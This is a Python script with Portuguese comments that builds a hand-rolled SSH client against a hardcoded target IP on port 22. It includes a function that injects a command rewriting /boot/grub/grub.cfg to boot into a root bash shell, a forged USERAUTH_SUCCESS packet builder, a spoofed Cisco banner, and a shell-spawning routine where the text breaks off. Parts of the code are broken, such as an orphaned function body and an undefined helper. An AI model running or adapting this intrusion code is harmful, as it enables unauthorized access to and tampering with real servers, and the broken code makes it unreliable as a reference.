
import socket, struct, time, os, select, hashlib, random, sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import hmac

# ============================================================
# CONFIGURAÇÕES
# ============================================================
TARGET = "115.68.95.118"
PORT = 22
KEEPALIVE_INTERVAL = 5
SESSION_TIMEOUT = 3600

# Primos DH (RFC 3526)
P_GROUP14_HEX = (
    "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
    "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
    "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
    "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
    "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE65B3D"
    "C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"
    "83655D23DCA3AD961C62F356208552BB9ED529077096966D"
    "670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"
    "E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"
    "DE2BC7BF6958817183995497CEA956AE515D2261898FA0515"
    "A5A6EBFEE366FBF482D431EA47FEDFAB8B27EF5B62090CD7"
    "4F0755B316EB6CEAACD11A0BEC8FFE86DCE18CE4822E72F8"
    "FC8FA64AE9FC8ECEDF1D7E92AF0B9E06341ED20A620B3B02"
    "DB3FB8B5B6ACB5FAF0E68393E67C0A5BFEAC36DFAB2B26FA"
    "E84BAFAF1B15F6727AF3B67CDF7DE29A3D02E342E205CF23"
    "EFA275347956A17F2332FC1362CBA03D70F0E75730EBBCEE"
    "B14064D5D34EB4D6FAC658C427EC931EE41DE68F6BE9FFB3"
    "101F7A9FED6F8E6675CBE6AFACBF31E7B63214263DFAACCB"
    "3C7F76206E7DAEE432D70622B75F8E6BE56FA08870CF0236"
    "9B117804D9ADEB04ED238EAEA02DE67B360F88B4232F5A5B"
    "C42EFCCBF08BB2D625ABFAC9F2A3ABFFFFFFFFFFFFFFFF"
)

P_GROUP1_HEX = (
    "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
    "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
    "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
    "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
    "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE65B3D"
    "C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"
    "83655D23DCA3AD961C62F356208552BB9ED529077096966D"
    "670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"
    "E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"
    "DE2BC7BF69588171839947"
)

# ============================================================
# FUNÇÕES AUXILIARES
# ============================================================

def hex_to_int(hex_str):
    clean = hex_str.replace(' ', '').replace('\n', '').replace('\r', '')
    return int(clean, 16)




def packetize(payload, block_size=8):
    # O SSH exige que o comprimento total seja múltiplo do block_size (geralmente 8 ou 16)
    # Padrão: [4 bytes len] [1 byte padding_len] [payload] [padding]
    padding_len = block_size - ((len(payload) + 5) % block_size)
    if padding_len < block_size: padding_len += block_size
    
    packet_len = len(payload) + padding_len + 1
    # Cria o header
    header = struct.pack(">IB", packet_len, padding_len)
    # Gera padding aleatório (essencial para evitar impressões digitais de tráfego)
    padding = os.urandom(padding_len)
    
    return header + payload + padding
def send_injection_command(sock, command="sed -i 's/ro quiet/rw init=\/bin\/bash/' /boot/grub/grub.cfg"):
    # 1. SSH_MSG_CHANNEL_DATA (94)
    # Você precisaria ter aberto um canal (90) antes, mas para uma injeção bruta:
    cmd_bytes = command.encode('ascii')
    payload = b'\x5E' + struct.pack(">I", 0) + struct.pack(">I", len(cmd_bytes)) + cmd_bytes
    sock.sendall(packetize(payload))
    print(f"    [!] Comando de injeção disparado: {command}")

def send_packet(sock, session_ctx, payload):
    """Envia um pacote SSH: aplica criptografia e MAC se `session_ctx` presente."""
    block_size = 8
    if session_ctx is not None and getattr(session_ctx, 'enc_algo', 'none') != 'none':
        if session_ctx.enc_algo.startswith('aes'):
            block_size = 16

    pkt = packetize(payload, block_size=block_size)
    if session_ctx is None or getattr(session_ctx, 'enc_algo', 'none') == 'none':
        sock.sendall(pkt)
        return

    try:
        ciphertext = session_ctx.encrypt_packet(pkt)
        mac = session_ctx.compute_mac_send(pkt)
        sock.sendall(ciphertext + mac)
    except Exception:
        try:
            sock.sendall(pkt)
        except:
            pass

def read_all_extended(sock, timeout_ms=5000):
    sock.settimeout(timeout_ms / 1000.0)
    data = b""
    start = time.time()
    got_data = False
    try:
        while (time.time() - start) < (timeout_ms / 1000.0):
            ready = select.select([sock], [], [], 0.03)
            if ready[0]:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                data += chunk
                got_data = True
                start = time.time()
            time.sleep(0.03)
    except:
        pass
    
    if not got_data:
        return None
    return data

def read_ssh_packets(data):
    """Parseia pacotes SSH de um buffer raw"""
    packets = []
    offset = 0
    while offset + 4 <= len(data):
        pkt_len = struct.unpack(">I", data[offset:offset+4])[0]
        if pkt_len > 65536 or pkt_len == 0:
            break
        if offset + 4 + pkt_len > len(data):
            break
        
        padding_len = data[offset + 4]
        payload_len = pkt_len - padding_len - 1
        
        if offset + 5 + payload_len > len(data):
            break
        
        msg_type = data[offset + 5]
        payload = data[offset + 5:offset + 5 + payload_len]
        raw = data[offset:offset + 4 + pkt_len]
        
        packets.append({
            'offset': offset,
            'length': pkt_len,
            'msg_type': msg_type,
            'payload': payload,
            'raw': raw
        })
        
        offset += 4 + pkt_len
    
    return packets

# ============================================================
# CONSTRUÇÃO DE PACOTES SSH
# ============================================================
import os

def build_kexinit(kex_algos):
    """
    Constrói o payload do SSH_MSG_KEXINIT (tipo 20).
    Campos obrigatórios: cookie, kex, hostkey, enc_c2s, enc_s2c, 
    mac_c2s, mac_s2c, comp_c2s, comp_s2c, lang_c2s, lang_s2c, first_kex_follow.
    """
    cookie = os.urandom(16)
    kex_list = ",".join(kex_algos).encode()
    host_keys = b"ssh-rsa"
    enc = b"aes128-cbc,aes128-ctr"
    macs = b"hmac-sha1,hmac-sha2-256"
    comp = b"none"
    lang = b""
    
    payload = b'\x14' # Msg Type 20
    payload += cookie
    
    # Função auxiliar para formatar como string SSH (len + data)
    def ssh_string(s): return struct.pack(">I", len(s)) + s
    
    payload += ssh_string(kex_list)
    payload += ssh_string(host_keys)
    payload += ssh_string(enc) # enc_c2s
    payload += ssh_string(enc) # enc_s2c
    payload += ssh_string(macs) # mac_c2s
    payload += ssh_string(macs) # mac_s2c
    payload += ssh_string(comp) # comp_c2s
    payload += ssh_string(comp) # comp_s2c
    payload += ssh_string(lang) # lang_c2s
    payload += ssh_string(lang) # lang_s2c
    
    payload += b'\x00' # first_kex_packet_follows
    payload += b'\x00\x00\x00\x00' # reserved
    
    return payload

def build_kexdh_init(mpint_e_bytes):
    # mpint_e_bytes já deve vir da nova função int_to_mpint
    payload = b'\x1E' + mpint_e_bytes
    return payload


def bytes_from_hex(hex_str):
    clean = hex_str.replace(' ', '').replace('\n', '').replace('\r', '')
    value = int(clean, 16)
    length = (value.bit_length() + 7) // 8
    return value.to_bytes(length, byteorder='big')


def get_dh_prime_bytes(kex_algo):
    if kex_algo == "diffie-hellman-group14-sha1":
        return bytes_from_hex(P_GROUP14_HEX)
    if kex_algo == "diffie-hellman-group1-sha1":
        return bytes_from_hex(P_GROUP1_HEX)
    return None


def parse_kexdh_reply(payload):
    # payload[0] é o msg_type (31)
    idx = 1
    
    # 1. Extrair K_S (Host Key)
    if idx + 4 > len(payload): return None
    hostkey_len = struct.unpack(">I", payload[idx:idx+4])[0]
    idx += 4
    if idx + hostkey_len > len(payload): return None
    
    # O K_S completo inclui os 4 bytes de tamanho + a chave em si
    k_s_raw = payload[idx-4 : idx+hostkey_len]
    idx += hostkey_len
    
    # 2. Extrair f (valor público do servidor)
    if idx + 4 > len(payload): return None
    f_len = struct.unpack(">I", payload[idx:idx+4])[0]
    idx += 4
    if idx + f_len > len(payload): return None
    
    f_bytes = payload[idx : idx+f_len]
    
    # 3. Extrair assinatura (necessária para validação, mas ignorada no cálculo do segredo)
    # A assinatura segue logo após o f_bytes
    
    return int.from_bytes(f_bytes, byteorder='big'), f_bytes, k_s_raw

def compute_exchange_hash(client_version, server_version, client_kex_packet, server_kex_packet, k_s_raw, e_raw, f_raw, shared_secret):
    """Compute the SSH exchange hash H for diffie-hellman-group*-sha1."""
    k_bytes = int_to_mpint(shared_secret)
    h_data = (
        client_version +
        server_version +
        client_kex_packet +
        server_kex_packet +
        k_s_raw +
        e_raw +
        f_raw +
        struct.pack(">I", len(k_bytes)) + k_bytes
    )
    return hashlib.sha1(h_data).digest()
import socket
import struct
import time

# ============================================================
# BLOCO 1: Utilitários de Formatação (Anti-RST/Protocol)
# ============================================================
def int_to_mpint(n):
    """Converte inteiro para formato MPINT (SSH) com bit de sinal (0x00)."""
    data = n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')
    if len(data) > 0 and (data[0] & 0x80):
        data = b'\x00' + data
    return struct.pack(">I", len(data)) + data

# ============================================================
# BLOCO 2: Handshake Resiliente (Com cálculo de Segredo)
# ============================================================
def perform_kexdh(sock, kex_algo, key_size, variant, client_version, server_version, client_kex_packet, server_kex_packet):
    shared_secret = None
    prime_bytes = get_dh_prime_bytes(kex_algo)
    _, private_int, p_int, public_int = generate_dh_key_fixed(prime_bytes, key_size)
    
    # Envio do KEXDH_INIT
    try:
        payload = b'\x1E' + int_to_mpint(public_int)
        sock.sendall(packetize(payload, block_size=8))
        print("    [+] KEXDH_INIT enviado.")
    except Exception as e:
        return False, None
    
    buffer = b""
    sock.settimeout(10.0)
    
    for _ in range(100):
        try:
            data = sock.recv(65536)
            if not data: break
            buffer += data
        except socket.timeout:
            send_keepalive(sock)
            continue
            
        while len(buffer) > 4:
            pkt_len = struct.unpack(">I", buffer[:4])[0]
            if len(buffer) < pkt_len + 4: break
            packet = buffer[4:4+pkt_len]
            buffer = buffer[4+pkt_len:]
            
            if packet[0] in [2, 3, 4]: continue
            
            if packet[0] == 31: # KEXDH_REPLY
                parsed = parse_kexdh_reply(packet)
                if parsed:
                    f_int, f_bytes, k_s_raw = parsed
                    # Derivação do Segredo Compartilhado
                    shared_secret = pow(f_int, private_int, p_int)
                    sock.sendall(packetize(b'\x15', block_size=8))
                    return True, {'shared_secret': shared_secret, 'k_s': k_s_raw, 'public_int': public_int, 'f_int': f_int}
            elif packet[0] == 1:
                return False, None
    return False, None

# ============================================================
# BLOCO 3: Conexão e Orquestração
# ============================================================
def connect_and_handshake(host, port, kex_algo, key_size, variant, chosen_enc, chosen_mac):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    
    try:
        # Conexão TCP
        sock.connect((host, port))
        
        # 1. [ESTRATÉGIA AGRESSIVA] Envia o banner imediatamente
        my_banner = b"SSH-2.0-Cisco-1.25\r\n"
        sock.sendall(my_banner)
        
        # 2. Recebe o banner do servidor
        server_version = sock.recv(1024)
        if not server_version:
            raise Exception("Servidor não enviou banner")
        print(f"    [+] Banner recebido: {server_version.decode(errors='ignore').strip()}")
        
        # 3. Envia o KEXINIT com o algoritmo selecionado da matriz
        kex_payload = build_kexinit([kex_algo])
        client_kex_packet = packetize(kex_payload)
        sock.sendall(client_kex_packet)
        print(f"    [DBG] KEXINIT enviado ({kex_algo})")
        
        # 4. Aguarda resposta do servidor (KEXINIT do servidor)
        server_data = read_all_extended(sock, timeout_ms=5000)
        packets = read_ssh_packets(server_data)
        server_kex_packet = next((p['raw'] for p in packets if p['msg_type'] == 20), None)
        
        if not server_kex_packet:
            print("    [!] Falha: Resposta KEXINIT inválida do servidor.")
            sock.close()
            return None, None, False

        # 5. Execução do Handshake Diffie-Hellman Resiliente
        handshake_ok, kex_data = perform_kexdh(
            sock, kex_algo, key_size, variant, 
            my_banner, server_version, 
            client_kex_packet, server_kex_packet
        )

        # 6. Validação final do Segredo Compartilhado
        if not handshake_ok or not kex_data or 'shared_secret' not in kex_data:
            print("    [!] Handshake falhou: Segredo não derivado.")
            sock.close()
            return None, None, False

        # 7. Contexto de sessão validado para pós-handshake
        session_ctx = SessionContext(
            kex_data['shared_secret'],
            kex_data.get('hash_value', b''),
            kex_data.get('session_id', b''),
            "aes128-cbc", 
            "hmac-sha1"
        )
        
        print(f"    [+] Handshake bem-sucedido com {kex_algo}")
        return sock, session_ctx, True
        
    except Exception as e:
        print(f"    [DBG] Erro na conexão/handshake: {e}")
        try: sock.close()
        except: pass
        return None, None, False
def send_keepalive(sock):
    try:
        # SSH_MSG_GLOBAL_REQUEST (80) - keepalive@openssh.com
        req_name = b"keepalive@openssh.com"
        payload = b'\x50' + struct.pack(">I", len(req_name)) + req_name + b'\x00'
        sock.sendall(packetize(payload, block_size=8))
        print("    [DBG] Keepalive enviado para prevenir RST.")
    except Exception:
        pass

def setup_socket_resilience(sock):
    # Evita que o SO envie um RST imediato ao fechar
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
    # Ativa o KeepAlive do sistema operacional
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    
    # Específico para Windows/Linux, tenta configurar intervalo rápido
    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 15)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
    except:
        pass

def build_newkeys():
    return b'\x15'

def build_service_request(service="ssh-userauth"):
    svc_bytes = service.encode()
    payload = b'\x05'
    payload += struct.pack(">I", len(svc_bytes))
    payload += svc_bytes
    return payload


def parse_name_list(payload, idx):
    if idx + 4 > len(payload):
        return None, idx
    length = struct.unpack(">I", payload[idx:idx+4])[0]
    idx += 4
    if idx + length > len(payload):
        return None, idx
    value = payload[idx:idx+length].decode(errors='ignore')
    return value, idx + length


def parse_kexinit_algorithms(payload):
    if len(payload) < 17 or payload[0] != 20:
        return None
    idx = 17
    keys = [
        'kex_algos', 'hostkey_algos',
        'enc_algos_ctos', 'enc_algos_stoc',
        'mac_algos_ctos', 'mac_algos_stoc',
        'comp_algos_ctos', 'comp_algos_stoc',
        'lang_ctos', 'lang_stoc'
    ]
    algos = {}
    for key in keys:
        value, idx = parse_name_list(payload, idx)
        if value is None:
            return None
        algos[key] = value
    return algos

def parse_kexinit(payload):
    """Parse KEXINIT payload and return algorithm lists."""
    if len(payload) < 17 or payload[0] != 20:
        return None
    idx = 1 + 16  # type + cookie
    fields = [
        'kex', 'host_key', 'enc_c2s', 'enc_s2c',
        'mac_c2s', 'mac_s2c', 'compress_c2s', 'compress_s2c',
        'lang_c2s', 'lang_s2c'
    ]
    result = {}
    for field in fields:
        if idx + 4 > len(payload):
            return None
        slen = struct.unpack(">I", payload[idx:idx+4])[0]
        idx += 4
        if idx + slen > len(payload):
            return None
        result[field] = payload[idx:idx+slen].decode(errors='ignore').split(',') if slen > 0 else []
        idx += slen
    if idx + 1 <= len(payload):
        result['first_kex'] = payload[idx]
    else:
        result['first_kex'] = 0
    return result


def choose_from_server(server_list, preferred_list):
    if not server_list:
        return None
    for algo in preferred_list:
        if algo in server_list:
            return algo
    for algo in server_list:
        if algo in preferred_list:
            return algo
    return None


def choose_algorithm(server_list, client_list):
    if isinstance(server_list, str):
        server_algos = [a.strip() for a in server_list.split(',') if a.strip()]
    else:
        server_algos = [a.strip() for a in server_list if isinstance(a, str) and a.strip()]
    if isinstance(client_list, str):
        client_algos = [a.strip() for a in client_list.split(',') if a.strip()]
    else:
        client_algos = [a.strip() for a in client_list if isinstance(a, str) and a.strip()]
    for algo in client_algos:
        if algo in server_algos:
            return algo
    return None


def build_userauth_request(username, password, service="ssh-connection"):
    """Constrói USERAUTH REQUEST (password method)"""
    payload = b'\x32'  # SSH_MSG_USERAUTH_REQUEST
    
    user_bytes = username.encode()
    payload += struct.pack(">I", len(user_bytes))
    payload += user_bytes
    
    svc_bytes = service.encode()
    payload += struct.pack(">I", len(svc_bytes))
    payload += svc_bytes
    
    method = b"password"
    payload += struct.pack(">I", len(method))
    payload += method
    
    payload += b'\x00'  # FALSE
    
    pass_bytes = password.encode()
    payload += struct.pack(">I", len(pass_bytes))
    payload += pass_bytes
    
    return payload

def build_keepalive():
    req_name = b"keepalive@openssh.com"
    payload = b'\x50'
    payload += struct.pack(">I", len(req_name))
    payload += req_name
    payload += b'\x00'
    return payload

def build_fake_userauth_success():
    """Constrói um USERAUTH_SUCCESS falso (MSG 52 = 0x34)"""
    payload = b'\x34'
    return payload

def build_userauth_pk_ok(username, service="ssh-connection", method="publickey"):
    """Constrói USERAUTH_PK_OK (MSG 60 = 0x3C)"""
    payload = b'\x3C'
    
    user_bytes = username.encode()
    payload += struct.pack(">I", len(user_bytes))
    payload += user_bytes
    
    svc_bytes = service.encode()
    payload += struct.pack(">I", len(svc_bytes))
    payload += svc_bytes
    
    method_bytes = method.encode()
    payload += struct.pack(">I", len(method_bytes))
    payload += method_bytes
    
    return payload

def build_channel_open_direct():
    """CHANNEL_OPEN (MSG 90 = 0x5A) para "session\""""
    payload = b'\x5A'
    
    channel_type = b"session"
    payload += struct.pack(">I", len(channel_type))
    payload += channel_type
    
    sender_channel = random.randint(1000, 65535)
    payload += struct.pack(">I", sender_channel)
    initial_window = 2097152
    payload += struct.pack(">I", initial_window)
    max_packet = 32768
    payload += struct.pack(">I", max_packet)
    
    return payload, sender_channel

def build_channel_open_direct_tcpip(target_host, target_port, origin_host="127.0.0.1", origin_port=0):
    """CHANNEL_OPEN (MSG 90) para "direct-tcpip\""""
    payload = b'\x5A'
    
    channel_type = b"direct-tcpip"
    payload += struct.pack(">I", len(channel_type))
    payload += channel_type
    
    sender_channel = random.randint(1000, 65535)
    payload += struct.pack(">I", sender_channel)
    initial_window = 2097152
    payload += struct.pack(">I", initial_window)
    max_packet = 32768
    payload += struct.pack(">I", max_packet)
    
    th_bytes = target_host.encode()
    payload += struct.pack(">I", len(th_bytes))
    payload += th_bytes
    payload += struct.pack(">I", target_port)
    
    oh_bytes = origin_host.encode()
    payload += struct.pack(">I", len(oh_bytes))
    payload += oh_bytes
    payload += struct.pack(">I", origin_port)
    
    return payload, sender_channel

def build_channel_request_shell(channel):
    """CHANNEL_REQUEST (MSG 98 = 0x62) para "shell\""""
    payload = b'\x62'
    payload += struct.pack(">I", channel)
    
    req_type = b"shell"
    payload += struct.pack(">I", len(req_type))
    payload += req_type
    payload += b'\x01'
    
    return payload

def build_channel_request_exec(channel, command):
    """CHANNEL_REQUEST (MSG 98 = 0x62) para "exec\""""
    payload = b'\x62'
    payload += struct.pack(">I", channel)
    
    req_type = b"exec"
    payload += struct.pack(">I", len(req_type))
    payload += req_type
    payload += b'\x01'
    
    cmd_bytes = command.encode()
    payload += struct.pack(">I", len(cmd_bytes))
    payload += cmd_bytes
    
    return payload

def build_channel_request_pty(channel, term="vt100", width_chars=80, height_rows=24, width_pixels=640, height_pixels=480):
    """CHANNEL_REQUEST (MSG 98 = 0x62) para "pty-req"""
    payload = b'\x62'
    payload += struct.pack(">I", channel)

    req_type = b"pty-req"
    payload += struct.pack(">I", len(req_type))
    payload += req_type
    payload += b'\x01'

    term_bytes = term.encode()
    payload += struct.pack(">I", len(term_bytes))
    payload += term_bytes
    payload += struct.pack(">I", width_chars)
    payload += struct.pack(">I", height_rows)
    payload += struct.pack(">I", width_pixels)
    payload += struct.pack(">I", height_pixels)
    payload += struct.pack(">I", 0)
    return payload

def build_channel_request_env(channel, var_name, var_value):
    """CHANNEL_REQUEST (MSG 98 = 0x62) para "env\""""
    payload = b'\x62'
    payload += struct.pack(">I", channel)
    
    req_type = b"env"
    payload += struct.pack(">I", len(req_type))
    payload += req_type
    payload += b'\x01'
    
    name_bytes = var_name.encode()
    payload += struct.pack(">I", len(name_bytes))
    payload += name_bytes
    
    val_bytes = var_value.encode()
    payload += struct.pack(">I", len(val_bytes))
    payload += val_bytes
    
    return payload

def build_userauth_request_none(username, service="ssh-connection"):
    """USERAUTH REQUEST com método "none\""""
    payload = b'\x32'
    
    user_bytes = username.encode()
    payload += struct.pack(">I", len(user_bytes))
    payload += user_bytes
    
    svc_bytes = service.encode()
    payload += struct.pack(">I", len(svc_bytes))
    payload += svc_bytes
    
    method = b"none"
    payload += struct.pack(">I", len(method))
    payload += method
    
    return payload

# ============================================================
# FUNÇÕES DH
# ============================================================
#def generate_dh_key(prime_bytes, key_size_bytes, variant="auto"):#
    p_int = int.from_bytes(prime_bytes, byteorder='big')
    g_int = 2
    
    private_bytes = os.urandom(32)
    private_bytes = bytes([private_bytes[0] & 0x7F]) + private_bytes[1:]
    private_int = int.from_bytes(private_bytes, byteorder='big') % (p_int - 1)
    if private_int <= 1:
        private_int = 2
    
    public_int = pow(g_int, private_int, p_int)
    mpint_e = int_to_mpint(public_int, variant=variant)
    
    return mpint_e, private_int, p_int
def generate_dh_key_fixed(prime_bytes, key_size_bytes):
    p_int = int.from_bytes(prime_bytes, byteorder='big')
    g_int = 2
    
    private_int = random.randint(2, p_int - 2)
    public_int = pow(g_int, private_int, p_int)
    
    # Retorna os 4 componentes necessários para o restante do script
    return None, private_int, p_int, public_int
# ============================================================
# NEGOCIAÇÃO E DERIVAÇÃO DE CHAVES
# ============================================================
def derive_keys(shared_secret, hash_value, key_iv_data_c2s, key_iv_data_s2c, session_id):
    """Deriva chaves de cifragem e MAC a partir do shared secret (RFC 4253)"""
    K = shared_secret
    H = hash_value
    
    def kdf(char, nbytes):
        k1 = hashlib.sha256(int_to_mpint(K) + H + char.encode() + session_id).digest()
        if nbytes <= len(k1):
            return k1[:nbytes]
        result = k1
        while len(result) < nbytes:
            k_next = hashlib.sha256(int_to_mpint(K) + H + result).digest()
            result += k_next
        return result[:nbytes]
    
    iv_c2s = kdf('A', 16)
    key_c2s = kdf('C', 16)
    iv_s2c = kdf('B', 16)
    key_s2c = kdf('D', 16)
    mac_c2s = kdf('E', 32)
    mac_s2c = kdf('F', 32)
    
    return {
        'iv_c2s': iv_c2s, 'key_c2s': key_c2s,
        'iv_s2c': iv_s2c, 'key_s2c': key_s2c,
        'mac_c2s': mac_c2s, 'mac_s2c': mac_s2c
    }

def encrypt_aes_ctr(data, key, iv):
    """Cifragem AES-128-CTR"""
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()

def decrypt_aes_ctr(data, key, iv):
    """Descriptografia AES-128-CTR"""
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(data) + decryptor.finalize()

def compute_hmac_sha2(key, data):
    """Computa HMAC-SHA2-256"""
    return hmac.new(key, data, hashlib.sha256).digest()

def compute_hmac_sha1(key, data):
    """Computa HMAC-SHA1"""
    return hmac.new(key, data, hashlib.sha1).digest()

def decrypt_aes_cbc(data, key, iv):
    """Descriptografia AES-128-CBC"""
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(data) + decryptor.finalize()

def encrypt_aes_cbc(data, key, iv):
    """Cifragem AES-128-CBC para SSH; os dados já chegam com padding aplicado."""
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()

# ============================================================
# GERENCIAMENTO DE SESSÃO CRIPTOGRAFADA
# ============================================================
class SessionContext:
    """Gerencia chaves e estado de criptografia da sessão SSH"""
    def __init__(self, shared_secret, hash_value, session_id, enc_algo, mac_algo):
        self.shared_secret = shared_secret
        self.hash_value = hash_value
        self.session_id = session_id
        self.enc_algo = enc_algo
        self.mac_algo = mac_algo
        self.sequence_num_c2s = 0
        self.sequence_num_s2c = 0
        
        self.keys = self._derive_keys()
        self.iv_c2s = self.keys['iv_c2s']
        self.key_c2s = self.keys['key_c2s']
        self.iv_s2c = self.keys['iv_s2c']
        self.key_s2c = self.keys['key_s2c']
        self.mac_c2s = self.keys['mac_c2s']
        self.mac_s2c = self.keys['mac_s2c']
        
        self.mac_len = 20 if mac_algo == "hmac-sha1" else 32
    
    def _derive_keys(self):
        """Deriva chaves usando RFC 4253"""
        K = self.shared_secret
        H = self.hash_value
        
        def kdf(char, nbytes):
            k1 = hashlib.sha1(int_to_mpint(K) + H + char.encode() + self.session_id).digest()
            if nbytes <= len(k1):
                return k1[:nbytes]
            result = k1
            while len(result) < nbytes:
                k_next = hashlib.sha1(int_to_mpint(K) + H + result).digest()
                result += k_next
            return result[:nbytes]
        
        iv_c2s = kdf('A', 16)
        key_c2s = kdf('C', 16)
        iv_s2c = kdf('B', 16)
        key_s2c = kdf('D', 16)
        mac_c2s = kdf('E', 20 if self.mac_algo == "hmac-sha1" else 32)
        mac_s2c = kdf('F', 20 if self.mac_algo == "hmac-sha1" else 32)
        
        return {
            'iv_c2s': iv_c2s, 'key_c2s': key_c2s,
            'iv_s2c': iv_s2c, 'key_s2c': key_s2c,
            'mac_c2s': mac_c2s, 'mac_s2c': mac_s2c
        }
    
    def verify_mac_raw(self, packet, mac):
        """Verifica MAC direto a partir do pacote plaintext e do MAC recebido."""
        if self.mac_algo == "none":
            return True

        seq_bytes = struct.pack(">I", self.sequence_num_s2c)
        if self.mac_algo == "hmac-sha1":
            computed_mac = compute_hmac_sha1(self.mac_s2c, seq_bytes + packet)
        else:
            computed_mac = compute_hmac_sha2(self.mac_s2c, seq_bytes + packet)

        return computed_mac[:self.mac_len] == mac

    def decrypt_packet(self, encrypted_data):
        """Descriptografa um ou mais registros SSH cifrados e verifica MACs."""
        if self.enc_algo == "none":
            return encrypted_data

        if self.enc_algo != "aes128-cbc":
            return None

        packets = []
        buf = encrypted_data
        while buf:
            if len(buf) < 16 + self.mac_len:
                return None

            first_block = decrypt_aes_cbc(buf[:16], self.key_s2c, self.iv_s2c)
            packet_length = struct.unpack(">I", first_block[:4])[0]
            total_ciphertext_len = 4 + packet_length
            if total_ciphertext_len % 16 != 0:
                return None
            if len(buf) < total_ciphertext_len + self.mac_len:
                return None

            ciphertext = buf[:total_ciphertext_len]
            mac = buf[total_ciphertext_len:total_ciphertext_len + self.mac_len]
            plaintext = decrypt_aes_cbc(ciphertext, self.key_s2c, self.iv_s2c)

            if not self.verify_mac_raw(plaintext, mac):
                return None

            packets.append(plaintext)
            self.sequence_num_s2c += 1
            self.iv_s2c = ciphertext[-16:]
            buf = buf[total_ciphertext_len + self.mac_len:]

        return b"".join(packets)
    
    def encrypt_packet(self, plaintext):
        """Cifragem de pacote SSH para enviar ao servidor"""
        if self.enc_algo == "none":
            return plaintext
        
        if self.enc_algo == "aes128-cbc":
            ciphertext = encrypt_aes_cbc(plaintext, self.key_c2s, self.iv_c2s)
            self.iv_c2s = ciphertext[-16:] if len(ciphertext) >= 16 else self.iv_c2s
        else:
            return None
        
        return ciphertext
    
    def verify_mac(self, plaintext):
        """Remove e verifica MAC do pacote recebido"""
        if self.mac_algo == "none":
            return plaintext, True
        
        if len(plaintext) < self.mac_len:
            return plaintext, False
        
        packet_data = plaintext[:-self.mac_len]
        received_mac = plaintext[-self.mac_len:]
        
        seq_bytes = struct.pack(">I", self.sequence_num_s2c)
        if self.mac_algo == "hmac-sha1":
            computed_mac = compute_hmac_sha1(self.mac_s2c, seq_bytes + packet_data)
        else:
            computed_mac = compute_hmac_sha2(self.mac_s2c, seq_bytes + packet_data)
        
        if computed_mac[:self.mac_len] == received_mac:
            self.sequence_num_s2c += 1
            return packet_data, True
        
        return plaintext, False
    
    def compute_mac_send(self, plaintext):
        """Computa MAC para pacote a enviar"""
        if self.mac_algo == "none":
            return b''
        
        seq_bytes = struct.pack(">I", self.sequence_num_c2s)
        if self.mac_algo == "hmac-sha1":
            mac = compute_hmac_sha1(self.mac_c2s, seq_bytes + plaintext)
        else:
            mac = compute_hmac_sha2(self.mac_c2s, seq_bytes + plaintext)
        
        self.sequence_num_c2s += 1
        return mac[:self.mac_len]


# ============================================================
# CONFIGURAÇÃO DE SOCKET
# ============================================================
def configure_socket(sock):
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        if hasattr(socket, 'TCP_KEEPIDLE'):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, KEEPALIVE_INTERVAL)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
    except Exception as e:
        print(f"    [DBG] Aviso config socket: {e}")

# ============================================================
# EXECUÇÃO INTERATIVA VIA CANAL
# ============================================================

def interactive_shell(sock, session_ctx, server_channel):
    """Aloca PTY, solicita shell e gerencia I/O em tempo real"""
    print(f"\n[+] Alocando PTY e solicitando Shell no canal {server_channel}...")
    
    pty_req = build_channel_request_pty(server_channel)
    send_packet(sock, session_ctx, pty_req)
    time.sleep(0.5)

    shell_req = build_channel_request_shell(server_channel)
    send_packet(sock, session_ctx, shell_req)
    
    print("[!] Shell interativo iniciado. Digite 'exit' para sair.")

    try:
        while True:
            ready, _, _ = select.select([sys.stdin, sock], [], [], 0.5)
            
            if sock in ready:
                packets = read_ssh_packets_decrypted(sock, session_ctx, timeout_ms=1000)
                if packets:
                    for p in packets:
                        if p['msg_type'] == 0x5E:
                            if len(p['payload']) >= 9:
                                data_len = struct.unpack(">I", p['payload'][5:9])[0]
